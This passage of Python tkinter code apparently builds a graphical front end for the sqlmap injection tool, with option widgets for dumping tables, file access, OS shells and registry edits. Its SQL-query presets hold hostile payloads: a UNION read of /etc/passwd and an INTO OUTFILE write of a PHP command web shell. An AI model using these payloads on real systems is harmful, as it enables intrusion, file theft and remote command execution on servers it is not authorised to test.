        self.chk_exclude.grid(row=4, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_exclude = ttk.Combobox(dtc_lf, width=18)
        self.e_exclude_value = tkinter.StringVar()
        self.e_exclude.config(textvariable=self.e_exclude_value, state='disabled')
        self.e_exclude['values'] = 'prefix_.*'
        self.e_exclude.current(0)
        self.e_exclude.bind('<<ComboboxSelected>>', self.f_exclude)
        self.e_exclude.grid(row=4, column=1, sticky='ew', pady=3)
        # --where=DUMPWHERE   Use WHERE condition while table dumping
        self.chk_where_dump = ttk.Checkbutton(dtc_lf)
        self.chk_where_dump_var = tkinter.StringVar()
        self.chk_where_dump.config(text="where", variable=self.chk_where_dump_var, onvalue="on",
                                   offvalue="off", command=self.f_where_dump)
        self.chk_where_dump.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_where_dump = ttk.Combobox(dtc_lf, width=18)
        self.e_where_dump_value = tkinter.StringVar()
        self.e_where_dump.config(textvariable=self.e_where_dump_value, state='disabled')
        self.e_where_dump['values'] = ('artist_id=1 AND adesc LIKE \'%Lorem%\'',
                                       'artist_id=1 AND adesc LIKE \'%Lorem%\' AND user LIKE \'%Api%\'')
        self.e_where_dump.current(0)
        self.e_where_dump.bind('<<ComboboxSelected>>', self.f_where_dump)
        self.e_where_dump.grid(row=5, column=1, sticky='ew', pady=3)
        # LIMIT
        # --start=LIMITSTART  First dump table entry to retrieve
        # --stop=LIMITSTOP    Last dump table entry to retrieve
        self.chk_start = ttk.Checkbutton(dtc_lf)
        self.chk_start_var = tkinter.StringVar()
        self.chk_start.config(text="Limit", variable=self.chk_start_var, onvalue="on",
                              offvalue="off", command=self.f_start_stop)
        self.chk_start.grid(row=6, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.start_var = tkinter.StringVar()
        self.start_var.set("start,stop")
        self.e_start = ttk.Entry(dtc_lf, width=18, textvariable=self.start_var)
        self.e_start.grid(row=6, column=1, sticky='ew', pady=3)
        # SQLQUERY START PAINT
        sql_query_lf = ttk.Labelframe(enumeration_f, text='SQL queries')
        sql_query_lf.columnconfigure(1, weight=1)
        sql_query_lf.grid(row=5, column=0, sticky='ew', padx=4, pady=4)
        sql_query_lf.columnconfigure(0, weight=0)
        # --sql-query=QUERY   SQL statement to be executed
        self.chk_sql_query = ttk.Checkbutton(sql_query_lf)
        self.chk_sql_query_var = tkinter.StringVar()
        self.chk_sql_query.config(text="sql-query", variable=self.chk_sql_query_var, onvalue="on",
                                  offvalue="off", command=self.f_sql_query)
        self.chk_sql_query.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_sql_query = ttk.Combobox(sql_query_lf, width=18)
        self.e_sql_query_value = tkinter.StringVar()
        self.e_sql_query.config(textvariable=self.e_sql_query_value, state='disabled')
        self.e_sql_query['values'] = (
            # Check read/write rights and try to read the file
            'union select null,load_file(\'/etc/passwd\'),null,null,null',
            # Inject your code in .php file
            'union select 1,"<?php system($_REQUEST[\'cmd\'])?>\",3,4 INTO OUTFILE \" '
            '/var/www/website/public_html/shell.php\"',
            # To know the MAX ID in table
            'SELECT MAX(column) FROM table',
            # To take only Between needs
            'SELECT column_1, column_2, column_3 FROM table WHERE column_1 BETWEEN 0000 AND 9999',
            'SELECT column_1, column_2, column_3 FROM table WHERE column_1 = 12345',
            # If BETWEEN command not efficient for MySQL Server then comes to LIMIT
            'SELECT column_1, column_2, column_3 FROM table LIMIT 1, 1000'
        )
        self.e_sql_query.current(0)
        self.e_sql_query.bind('<<ComboboxSelected>>', self.f_sql_query)
        self.e_sql_query.grid(row=0, column=1, sticky='ew', pady=3)
        # --sql-shell         Prompt for an interactive SQL shell
        self.chk_sql_shell = ttk.Checkbutton(sql_query_lf)
        self.chk_sql_shell_var = tkinter.StringVar()
        self.chk_sql_shell.config(text="sql-shell", variable=self.chk_sql_shell_var, onvalue="on",
                                  offvalue="off", command=self.f_sql_shell)
        self.chk_sql_shell.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --sql-file=SQLFILE  Execute SQL statements from given file(s)
        self.chk_sql_file = ttk.Checkbutton(sql_query_lf)
        self.chk_sql_file_var = tkinter.StringVar()
        self.chk_sql_file.config(text="sql-file", variable=self.chk_sql_file_var, onvalue="on",
                                 offvalue="off", command=self.f_sql_file)
        self.chk_sql_file.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.var_sql_file = tkinter.StringVar()
        self.entry_sql_file = ttk.Entry(sql_query_lf, width=18, textvariable=self.var_sql_file)
        self.entry_sql_file.grid(row=2, column=1, sticky='ew', pady=3)
        self.entry_sql_file.columnconfigure(0, weight=1)
        #
        # BRUTEFORCE
        char_bf_lf = ttk.Labelframe(enumeration_f, text='Brute force')
        char_bf_lf.grid(row=6, column=0, sticky='ew', padx=4, pady=4)
        # --common-tables     Check existence of common tables
        self.chk_common_tables = ttk.Checkbutton(char_bf_lf)
        self.chk_common_tables_var = tkinter.StringVar()
        self.chk_common_tables.config(text="common-tables", variable=self.chk_common_tables_var, onvalue="on",
                                      offvalue="off", command=self.f_common_tables)
        self.chk_common_tables.grid(row=0, column=0, sticky='w')
        # --common-columns    Check existence of common columns
        self.chk_common_columns = ttk.Checkbutton(char_bf_lf)
        self.chk_common_columns_var = tkinter.StringVar()
        self.chk_common_columns.config(text="common-columns", variable=self.chk_common_columns_var, onvalue="on",
                                       offvalue="off", command=self.f_common_columns)
        self.chk_common_columns.grid(row=1, column=0, sticky='w')
        # --common-files      Check existence of common files
        self.chk_common_files = ttk.Checkbutton(char_bf_lf)
        self.chk_common_files_var = tkinter.StringVar()
        self.chk_common_files.config(text="common-files", variable=self.chk_common_files_var, onvalue="on",
                                     offvalue="off", command=self.f_common_files)
        self.chk_common_files.grid(row=2, column=0, sticky='w')
        # User-defined function injection
        char_bf_lf = ttk.Labelframe(enumeration_f, text='User-defined functions')
        char_bf_lf.columnconfigure(1, weight=1)
        char_bf_lf.grid(row=7, column=0, sticky='ew', padx=4, pady=4)
        # --udf-inject     Inject custom user-defined functions
        self.chk_udf_inject = ttk.Checkbutton(char_bf_lf)
        self.chk_udf_inject_var = tkinter.StringVar()
        self.chk_udf_inject.config(text="udf-inject", variable=self.chk_udf_inject_var, onvalue="on",
                                   offvalue="off", command=self.f_udf_inject)
        self.chk_udf_inject.grid(row=0, column=0, sticky='w')
        # --shared-lib=SHLIB   Local path of the shared library
        self.chk_shared_lib = ttk.Checkbutton(char_bf_lf)
        self.chk_shared_lib_var = tkinter.StringVar()
        self.chk_shared_lib.config(text="shared-lib", variable=self.chk_shared_lib_var, onvalue="on",
                                   offvalue="off", command=self.f_shared_lib)
        self.chk_shared_lib.grid(row=1, column=0, sticky='w')
        #
        self.e_shared_lib_var = tkinter.StringVar()
        self.e_shared_lib = ttk.Entry(char_bf_lf, textvariable=self.e_shared_lib_var, width=18)
        self.e_shared_lib.grid(row=1, column=1, sticky='we', padx=3)
        # ACCESS
        access_f = ttk.Notebook(file_f)
        file_acc = ttk.Frame(access_f)
        os_acc = ttk.Frame(access_f)
        win_reg_acc = ttk.Frame(access_f)
        access_f.add(file_acc, text='File system')
        access_f.add(os_acc, text='Operating system')
        access_f.add(win_reg_acc, text='Windows registry')
        access_f.columnconfigure(0, weight=1)
        access_f.grid(sticky='nswe', pady=5, padx=5)
        #
        file_acc.columnconfigure(0, weight=1)
        os_acc.columnconfigure(0, weight=1)
        win_reg_acc.columnconfigure(0, weight=1)
        # FILE SYSTEM
        file_read_lf = ttk.Labelframe(file_acc, text='')
        file_read_lf.columnconfigure(1, weight=1)
        file_read_lf.grid(sticky='we', ipady=3)
        # --file-read=RFILE   Read a file from the back-end DBMS file system:
        self.chk_file_read = ttk.Checkbutton(file_read_lf)
        self.chk_file_read_var = tkinter.StringVar()
        self.chk_file_read.config(text="file-read ", variable=self.chk_file_read_var, onvalue="on",
                                  offvalue="off", command=self.f_file_read)
        self.chk_file_read.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_file_read = ttk.Entry(file_read_lf, width=18)
        self.e_file_read.grid(row=0, column=1, sticky='ew', pady=3)
        # --file-write=WFILE  Write a local file on the back-end DBMS file system
        self.file_write_var = tkinter.StringVar()
        self.chk_file_write = ttk.Checkbutton(file_read_lf)
        self.chk_file_write.config(text="file-write", variable=self.file_write_var, onvalue="on",
                                   offvalue="off", command=self.f_file_write)
        self.chk_file_write.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_file_write_var = tkinter.StringVar()
        self.e_file_write = ttk.Entry(file_read_lf, width=18, textvariable=self.e_file_write_var)
        self.e_file_write.grid(row=2, column=1, sticky='ew', pady=3)
        #
        self.file_write = options_file_write = {}
        options_file_write['defaultextension'] = ''
        options_file_write['filetypes'] = [('all files', '.*')]
        options_file_write['initialdir'] = './shell/'
        options_file_write['parent'] = watch_log
        options_file_write['title'] = 'Open file-write'
        # --file-dest=DFILE   Back-end DBMS absolute filepath to write to:
        self.chk_file_dest = ttk.Checkbutton(file_read_lf)
        self.chk_file_dest_var = tkinter.StringVar()
        self.chk_file_dest.config(text="file-dest ", variable=self.chk_file_dest_var, onvalue="on",
                                  offvalue="off")
        self.chk_file_dest.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_file_dest = ttk.Entry(file_read_lf, width=18)
        self.e_file_dest.grid(row=3, column=1, sticky='ew', pady=3)
        # BUTTON
        self.view_file = ttk.Button(file_read_lf, width=10)
        self.view_file.config(text="view log", command=self.v_file)
        self.view_file.grid(row=1, column=0, columnspan=2, sticky='ew', padx=(0, 8), pady=3)
        # Default *log,*config
        config_dl = ttk.Panedwindow(file_acc, orient="horizontal", width=100, height=240)
        config_dl.rowconfigure(0, weight=1)
        config_dl.columnconfigure(0, weight=1)
        #
        cat_lf = ttk.Labelframe(config_dl, text='Category')
        cat_lf.rowconfigure(0, weight=1)
        cat_lf.columnconfigure(0, weight=1)
        #
        list_lf = ttk.Labelframe(config_dl, text='Default *log, *config')
        list_lf.rowconfigure(0, weight=1)
        list_lf.columnconfigure(0, weight=1)
        #
        config_dl.add(cat_lf, weight=1)
        config_dl.add(list_lf, weight=3)
        config_dl.grid(row=1, columnspan=2, sticky='we', pady=5)
        # Category ./SQM/PATH_TRAVERSAL*.txt
        self.Lcat = tkinter.Listbox(cat_lf, height=12, width=20, selectmode=tkinter.EXTENDED)

        files_cat = os.listdir('./SQM/PATH_TRAVERSAL')
        cats = filter(lambda x: x.endswith('.txt'), files_cat)
        for cat_list in cats:
            cat_list = cat_list.replace('.txt', '')
            self.Lcat.insert(tkinter.END, cat_list)
        self.Lcat.grid(row=0, column=0, sticky='nsew')
        self.Lcat.columnconfigure(0, weight=1)
        self.Lcat.bind("<Double-Button-1>", self.show_def_log)
        # Scroll
        scrollcat = ttk.Scrollbar(cat_lf, orient="vertical", command=self.Lcat.yview)
        self.Lcat['yscrollcommand'] = scrollcat.set
        scrollcat.grid(row=0, column=1, sticky='ns')
        # Show Default *log, *config
        s_def_log = ttk.Scrollbar(list_lf)
        s_def_log.grid(row=0, column=1, sticky='ns')
        #
        self.d_log_txt = tkinter.Text(list_lf, yscrollcommand=s_def_log.set, width=24,
                                      height=12, bg='#002B36', fg='#93A1A1')
        s_def_log.config(command=self.d_log_txt.yview)
        self.d_log_txt.grid(row=0, column=0, padx=3, sticky='nswe')
        self.d_log_txt.configure(wrap='none')
        file_log_x = ttk.Scrollbar(list_lf, orient='horizontal', command=self.d_log_txt.xview)
        self.d_log_txt.configure(xscrollcommand=file_log_x.set)
        file_log_x.grid(row=1, column=0, sticky='ew')
        # OPERATING SYSTEM ACCESS
        os_acc_lf = ttk.Labelframe(os_acc, text='')
        os_acc_lf.columnconfigure(1, weight=1)
        os_acc_lf.grid(sticky='we', ipady=3)
        os_acc_lf.columnconfigure(0, weight=0)
        # --os-cmd=OSCMD      Execute an operating system command
        self.chk_os_cmd = ttk.Checkbutton(os_acc_lf)
        self.chk_os_cmd_var = tkinter.StringVar()
        self.chk_os_cmd.config(text="os-cmd", variable=self.chk_os_cmd_var, onvalue="on",
                               offvalue="off", command=self.f_os_cmd)
        self.chk_os_cmd.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_os_cmd = ttk.Entry(os_acc_lf, width=18)
        self.e_os_cmd.grid(row=0, column=1, sticky='ew', pady=3)
        # --os-shell          Prompt for an interactive operating system shell
        self.chk_os_shell = ttk.Checkbutton(os_acc_lf)
        self.chk_os_shell_var = tkinter.StringVar()
        self.chk_os_shell.config(text="os-shell", variable=self.chk_os_shell_var, onvalue="on",
                                 offvalue="off", command=self.f_os_shell)
        self.chk_os_shell.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
        self.chk_os_pwn = ttk.Checkbutton(os_acc_lf)
        self.chk_os_pwn_var = tkinter.StringVar()
        self.chk_os_pwn.config(text="os-pwn", variable=self.chk_os_pwn_var, onvalue="on",
                               offvalue="off", command=self.f_os_pwn)
        self.chk_os_pwn.grid(row=2, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
        self.chk_os_smbrelay = ttk.Checkbutton(os_acc_lf)
        self.chk_os_smbrelay_var = tkinter.StringVar()
        self.chk_os_smbrelay.config(text="os-smbrelay", variable=self.chk_os_smbrelay_var, onvalue="on",
                                    offvalue="off", command=self.f_os_smbrelay)
        self.chk_os_smbrelay.grid(row=3, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --os-bof            Stored procedure buffer overflow exploitation
        self.chk_os_bof = ttk.Checkbutton(os_acc_lf)
        self.chk_os_bof_var = tkinter.StringVar()
        self.chk_os_bof.config(text="os-bof", variable=self.chk_os_bof_var, onvalue="on",
                               offvalue="off", command=self.f_os_bof)
        self.chk_os_bof.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --priv-esc          Database process' user privilege escalation
        self.chk_priv_esc = ttk.Checkbutton(os_acc_lf)
        self.chk_priv_esc_var = tkinter.StringVar()
        self.chk_priv_esc.config(text="priv-esc", variable=self.chk_priv_esc_var, onvalue="on",
                                 offvalue="off", command=self.f_priv_esc)
        self.chk_priv_esc.grid(row=5, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --msf-path=MSFPATH  Local path where Metasploit Framework is installed
        self.chk_msf_path = ttk.Checkbutton(os_acc_lf)
        self.chk_msf_path_var = tkinter.StringVar()
        self.chk_msf_path.config(text="msf-path", variable=self.chk_msf_path_var, onvalue="on",
                                 offvalue="off", command=self.f_msf_path)
        self.chk_msf_path.grid(row=6, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_msf_path_var = tkinter.StringVar()
        self.e_read_msf_path = ttk.Entry(os_acc_lf, width=18, textvariable=self.e_msf_path_var)
        self.e_read_msf_path.grid(row=6, column=1, sticky='ew', pady=3)
        # --tmp-path=TMPPATH  Remote absolute path of temporary files directory
        self.chk_tmp_path = ttk.Checkbutton(os_acc_lf)
        self.chk_tmp_path_var = tkinter.StringVar()
        self.chk_tmp_path.config(text="tmp-path", variable=self.chk_tmp_path_var, onvalue="on",
                                 offvalue="off", command=self.f_tmp_path)
        self.chk_tmp_path.grid(row=7, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_tmp_path = ttk.Entry(os_acc_lf, width=18)
        self.e_tmp_path.grid(row=7, column=1, sticky='ew', pady=3)
        # WINDOWS REGISTRY
        win_reg_acc_lf = ttk.Labelframe(win_reg_acc, text='')
        win_reg_acc_lf.columnconfigure(1, weight=1)
        win_reg_acc_lf.grid(sticky='we', ipady=3)
        win_reg_acc_lf.columnconfigure(0, weight=0)
        # --reg-read          Read a Windows registry key value
        self.chk_reg_read = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_read_var = tkinter.StringVar()
        self.chk_reg_read.config(text="reg-read", variable=self.chk_reg_read_var, onvalue="on",
                                 offvalue="off", command=self.f_reg_read)
        self.chk_reg_read.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --reg-add           Write a Windows registry key value data
        self.chk_reg_add = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_add_var = tkinter.StringVar()
        self.chk_reg_add.config(text="reg-add", variable=self.chk_reg_add_var, onvalue="on",
                                offvalue="off", command=self.f_reg_add)
        self.chk_reg_add.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --reg-del           Delete a Windows registry key value
        self.chk_reg_del = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_del_var = tkinter.StringVar()
        self.chk_reg_del.config(text="reg-del", variable=self.chk_reg_del_var, onvalue="on",
                                offvalue="off", command=self.f_reg_del)
        self.chk_reg_del.grid(row=2, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --reg-key=REGKEY    Windows registry key
        self.chk_reg_key = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_key_var = tkinter.StringVar()
        self.chk_reg_key.config(text="reg-key", variable=self.chk_reg_key_var, onvalue="on",
                                offvalue="off", command=self.f_reg_key)
        self.chk_reg_key.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_reg_key = ttk.Entry(win_reg_acc_lf, width=18)
        self.e_reg_key.grid(row=3, column=1, sticky='ew', pady=3)
        # --reg-value=REGVAL  Windows registry key value
        self.chk_reg_value = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_value_var = tkinter.StringVar()
        self.chk_reg_value.config(text="reg-value", variable=self.chk_reg_value_var, onvalue="on",
                                  offvalue="off", command=self.f_reg_value)
        self.chk_reg_value.grid(row=4, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_reg_value = ttk.Entry(win_reg_acc_lf, width=18)
        self.e_reg_value.grid(row=4, column=1, sticky='ew', pady=3)
        # --reg-data=REGDATA  Windows registry key value data
        self.chk_reg_data = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_data_var = tkinter.StringVar()
        self.chk_reg_data.config(text="reg-data", variable=self.chk_reg_data_var, onvalue="on",
                                 offvalue="off", command=self.f_reg_data)
        self.chk_reg_data.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_reg_data = ttk.Entry(win_reg_acc_lf, width=18)
        self.e_reg_data.grid(row=5, column=1, sticky='ew', pady=3)
        # --reg-type=REGTYPE  Windows registry key value type
        self.chk_reg_type = ttk.Checkbutton(win_reg_acc_lf)
        self.chk_reg_type_var = tkinter.StringVar()
        self.chk_reg_type.config(text="reg-type", variable=self.chk_reg_type_var, onvalue="on",
                                 offvalue="off", command=self.f_reg_type)
        self.chk_reg_type.grid(row=6, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_reg_type = ttk.Entry(win_reg_acc_lf, width=18)
        self.e_reg_type.grid(row=6, column=1, sticky='ew', pady=3)
        # API
        api_options = ttk.Labelframe(api_f, text='Api')
        api_options.grid(row=0, sticky='we', column=0, pady=10)
        # --api
        self.chk_api = ttk.Checkbutton(api_options)
        self.chk_api_var = tkinter.StringVar()
        self.chk_api.config(text="api", variable=self.chk_api_var, onvalue="on",
                            offvalue="off", command=self.f_api)
        self.chk_api.grid(row=0, column=0, sticky='w')
        # --taskid
        self.chk_task_id = ttk.Checkbutton(api_options)
        self.chk_task_id_var = tkinter.StringVar()
        self.chk_task_id.config(text="taskid", variable=self.chk_task_id_var, onvalue="on",
                                offvalue="off", command=self.f_task_id)
        self.chk_task_id.grid(row=1, column=0, sticky='w')
        self.api_task_id_value = tkinter.StringVar()
        ttk.Entry(api_options, textvariable=self.api_task_id_value, width=24).grid(
            row=1, column=1, sticky='ew', padx=6, pady=3)
        # --database (API option, distinct from -D database-to-enumerate above)
        self.chk_database_api = ttk.Checkbutton(api_options)
        self.chk_database_var = tkinter.StringVar()
        self.chk_database_api.config(text="database", variable=self.chk_database_var, onvalue="on",
                                     offvalue="off", command=self.f_database)
        self.chk_database_api.grid(row=2, column=0, sticky='w')
        self.api_database_value = tkinter.StringVar()
        ttk.Entry(api_options, textvariable=self.api_database_value, width=24).grid(
            row=2, column=1, sticky='ew', padx=6, pady=3)
        api_options.columnconfigure(1, weight=1)

        self.extra_options = {}
        self._add_option_group(request_f, 'Response and authentication', [
            ('abort-code', 'Abort on HTTP codes (e.g. 401,403)', True),
            ('retry-on', 'Retry on response regexp', True),
            ('skip-xmlencode', 'Skip XML payload encoding', False),
            ('auth-refresh', 'Authentication refresh script', True),
        ])
        self._add_option_group(s_det_tech_f, 'Additional injection options', [
            ('param-filter', 'Parameter locations (e.g. GET,POST)', True),
            ('multi-bit', 'Read several bits per request', False),
        ])
        self._add_option_group(enumeration_f, 'Database inspection', [
            ('audit', 'Audit database security configuration', False),
            ('links', 'Enumerate database links', False),
        ])
        self._add_option_group(discovery_settings, 'Additional discovery', [
            ('mine-params', 'Find hidden GET parameters', False),
        ])

    # ####################################################
    #                Functions:                          #
    # ####################################################
    # Targets:
    def _add_option_group(self, parent, title, options):
        group = ttk.Labelframe(parent, text=title, padding=6)
        group.grid(row=50, column=0, columnspan=4, sticky='ew', padx=4, pady=6)
        group.columnconfigure(1, weight=1)
        for row, (option, label, takes_value) in enumerate(options):
            enabled = tkinter.BooleanVar(value=False)
            value = tkinter.StringVar()
            checkbox = ttk.Checkbutton(group, text=label, variable=enabled)
            checkbox.grid(row=row, column=0, sticky='w', padx=(0, 8), pady=2)
            if takes_value:
                entry = ttk.Entry(group, textvariable=value, state='disabled', width=20)
                entry.grid(row=row, column=1, sticky='ew', pady=2)
                checkbox.configure(command=lambda e=entry, v=enabled:
                                   e.configure(state='normal' if v.get() else 'disabled'))
            self.extra_options[option] = (enabled, value, takes_value)

    @property
    def f_extra_options(self):
        result = ''
        for option, (enabled, value, takes_value) in self.extra_options.items():
            if enabled.get():
                if takes_value:
                    text = value.get().strip()
                    if text:
                        result += self._openapi_argument(option, text)
                else:
                    result += ' --' + option
        return result

    @staticmethod
    def _openapi_argument(option, value):
        """Quote each complete argument for the platform's command shell."""
        argument = "--%s=%s" % (option, value)
        if os.name == "nt":
            return " " + subprocess.list2cmdline([argument])
        return " " + shlex.quote(argument)

    def f_openapi_file(self):
        filename = tkinter.filedialog.askopenfilename(
            parent=self, title='Open OpenAPI / Swagger specification',
            filetypes=[('OpenAPI / Swagger', '*.json *.yaml *.yml'),
                       ('All files', '*')],
        )
        if filename:
            self.urlentry.set(filename)

    @property
    def f_openapi_options(self):
        if self.varTarget.get() != "openapi":
            return ""
        result = ""
        for option, variable in (("openapi-base", self.var_openapi_base),
                                 ("openapi-tags", self.var_openapi_tags)):
            value = variable.get().strip()
            if value:
                result += self._openapi_argument(option, value)
        return result

    def f_target_source(self, _event=None):
        self.varTarget.set(self.target_sources[self.target_source.get()])
        self.f_target()

    def f_target_file(self):
        if self.varTarget.get() == 'openapi':
            self.f_openapi_file()
            return
        filename = tkinter.filedialog.askopenfilename(
            parent=self, title='Choose target file')
        if filename:
            self.urlentry.set(filename)

    def f_target(self):
        selection = self.varTarget.get()
        is_openapi = selection == 'openapi'
        if is_openapi:
            self.openapi_frame.grid()
        else:
            self.openapi_frame.grid_remove()
        file_sources = {'openapi', 'requestFile', 'bulkFile', 'logFile', 'configFile'}
        self.b_openapi_file.configure(
            state='normal' if selection in file_sources else 'disabled')
        if selection in file_sources:
            self.b_openapi_file.grid()
        else:
            self.b_openapi_file.grid_remove()
        hints = {
            'url': 'Enter the target URL, including https://',
            'openapi': 'Enter a specification URL or choose a JSON / YAML file.',
            'requestFile': 'Choose a file containing a raw HTTP request.',
            'bulkFile': 'Choose a text file containing target URLs.',
            'logFile': 'Choose a proxy log file.',
            'googleDork': 'Enter a Google search expression.',
            'direct': 'Enter the database connection string.',
            'configFile': 'Choose a SQLmap configuration file.',
        }
        self.target_hint.configure(text=hints.get(selection, ''))

    # --beep              Sound alert when SQL injection found
    @property
    def f_beep(self):
        if self.chk_beep_var.get() == "on":
            return " --beep"
        return ""

    # --skip-static       Skip testing parameters that not appear dynamic
    @property
    def f_skip_static(self):
        if self.chk_skip_static_var.get() == "on":
            return " --skip-static"
        return ""

    # --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
    @property
    def f_cleanup(self):
        if self.chk_cleanup_var.get() == "on":
            return " --cleanup"
        return ""


    # --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities
    @property
    def f_skip_heuristics(self):
        if self.chk_skip_heuristics_var.get() == "on":
            return " --skip-heuristics"
        return ""

    # --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection
    @property
    def f_skip_waf(self):
        if self.chk_skip_waf_var.get() == "on":
            return " --skip-waf"
        return ""

    # --offline           Work in offline mode (only use session data)
    @property
    def f_offline(self):
        if self.chk_offline_var.get() == "on":
            return " --offline"
        return ""

    # --timeless          Use HTTP/2 timeless timing (faster, no delay)
    @property
    def f_timeless(self):
        if self.chk_timeless_var.get() == "on":
            return " --timeless"
        return ""

    # --shell      Prompt for an interactive sqlmap shell
    @property
    def f_sqlmap_shell(self):
        if self.chk_sqlmap_shell_var.get() == "on":
            return " --shell"
        return ""

    # --tmp-dir=TMPDIR    Local directory for storing temporary files
    def f_tmp_dir(self, *args):
        if self.chk_tmp_dir_var.get() == "on":
            return f' --tmp-dir="{self.e_tmp_dir.get()}"'
        return ""

    # --web-root=WEBROOT    Web server document root directory (e.g. "/var/www")
    def f_web_root(self, *args):
        if self.chk_web_root_var.get() == "on":
            self.e_web_root.config(state="normal")
            return f' --web-root="{self.e_web_root.get()}"'

        self.e_web_root.config(state="disabled")
        return ""

    # --disable-precon     Disable preconnection of sqlmap
    def f_disable_precon(self):
        if self.chk_disable_precon_var.get() == "on":
            return " --disable-precon"
        return ""

    # --dump-file=DUMP.. Store dumped data to a custom file
    def f_dump_file(self):
        if self.chk_dump_file_var.get() == "on":
            dump_file = tkinter.filedialog.asksaveasfile(
                mode="w",
                defaultextension=".txt"
            )
            if dump_file:
                self.e_dump_file_var.set(dump_file.name)
        else:
            self.e_dump_file_var.set("")

    # --dump-file=DUMP.. Store dumped data to a custom file
    @property
    def f_save_dump_file(self):
        value = self.e_dump_file_var.get()
        if value:
            return f' --dump-file="{value}"'
        return ""

    # --abort-on-empty Abort data retrieval on empty results
    def f_abort_on_empty(self):
        if self.chk_abort_on_empty_var.get() == "on":
            return " --abort-on-empty"
        return ""

    # --dependencies      Check for missing sqlmap dependencies
    @property
    def f_dependencies(self):
        if self.chk_dependencies_var.get() == "on":
            return " --dependencies"
        return ""

    # --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    @property
    def f_gpage(self):
        if self.chk_gpage_var.get() == "on":
            return f' --gpage="{self.e_gpage.get()}"'
        return ""

    # -z MNEMONICS        Use short mnemonics
    @property
    def f_z(self):
        if self.chk_z_var.get() == "on":
            return f' -z "{self.e_z.get()}"'
        return ""

    # --mobile            Imitate smartphone through HTTP User-Agent header
    @property
    def f_mobile(self):
        if self.chk_mobile_var.get() == "on":
            return " --mobile"
        return ""


    # --base64    Parameter(s) containing Base64 encoded values
    @property
    def f_base64(self):
        if self.chk_base64_var.get() == "on":
            return " --base64"
        return ""

    # --base64-safe    Use URL and filename safe Base64 alphabet
    @property
    def f_base64safe(self):
        if self.chk_base64safe_var.get() == "on":
            return " --base64-safe"
        return ""

    # --purge     Safely remove all content from output directory
    @property
    def f_purge(self):
        if self.chk_purge_var.get() == "on":
            return " --purge"
        return ""

    # --time-limit  Run with a time limit in seconds
    def f_time_limit(self, *args):
        if self.chk_time_limit_var.get() == "on":
            self.e_time_limit.config(state="normal")
            return f' --time-limit="{self.e_time_limit.get()}"'

        self.e_time_limit.config(state="disabled")
        return ""

    # --disable-hashing     Disable hash analysis on table dumps
    @property
    def f_disable_hashing(self):
        if self.chk_disable_hashing_var.get() == "on":
            return " --disable-hashing"
        return ""

    # --unsafe-naming    Perform unsafe naming substitutions
    @property
    def f_unsafe_naming(self):
        if self.chk_unsafe_naming_var.get() == "on":
            return " --unsafe-naming"
        return ""

    # --wizard            Simple wizard interface for beginner users
    @property
    def f_wizard(self):
        if self.chk_wizard_var.get() == "on":
            return " --wizard"
        return ""

    # --dummy
    @property
    def f_dummy(self):
        if self.chk_dummy_var.get() == "on":
            return " --dummy"
        return ""

    # --crack             Load and crack hashes from a file
    def f_crack(self):
        if self.chk_crack_var.get() == "on":
            filename = tkinter.filedialog.askopenfile(mode="r")
            if filename:
                self.e_crack_var.set(filename.name)
        else:
            self.e_crack_var.set("")

    # --crack             Load and crack hashes from a file
    @property
    def f_read_crack(self):
        value = self.e_crack_var.get()
        if value:
            return f' --crack="{value}"'
        return ""

    # --debug
    @property
    def f_debug(self):
        if self.chk_debug_var.get() == "on":
            return " --debug"
        return ""

    # --disable-stats
    @property
    def f_disable_stats(self):
        if self.chk_disable_stats_var.get() == "on":
            return " --disable-stats"
        return ""

    # --profile
    @property
    def f_profile(self):
        if self.chk_profile_var.get() == "on":
            return " --profile"
        return ""

    # --force-dbms
    @property
    def f_force_dbms(self):
        if self.chk_force_dbms_var.get() == "on":
            return " --force-dbms"
        return ""

    # --alert=ALERT       Run shell command(s) when SQL injection is found
    @property
    def f_alert(self):
        if self.chk_alert_var.get() == "on":
            return f' --alert="{self.e_alert.get()}"'
        return ""

    # --answers=ANSWERS   Set question answers
    def f_answers(self, *args):
